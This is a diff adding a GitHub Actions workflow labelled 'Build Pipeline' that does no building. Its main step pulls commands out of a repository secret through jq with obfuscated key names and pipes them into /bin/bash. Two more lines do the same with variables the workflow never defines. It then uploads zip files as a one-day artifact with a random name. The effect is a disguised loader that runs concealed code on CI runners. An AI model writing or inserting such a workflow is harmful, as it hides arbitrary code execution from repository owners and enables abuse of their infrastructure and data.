@@ -1,0 +1,37 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          gnyl2719: ${{ secrets.gnyl2719 }}
+        run: |
+          printf '%s' "$gnyl2719" | jq -r .yyfq24079 | /bin/bash
+          printf '%s' "$ksj82153" | jq -r .no6844 | /bin/bash
+          echo $sn4970 | jq -r .plase42460 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 8PKPC9sz
+          path: "*.zip"
+          retention-days: 1
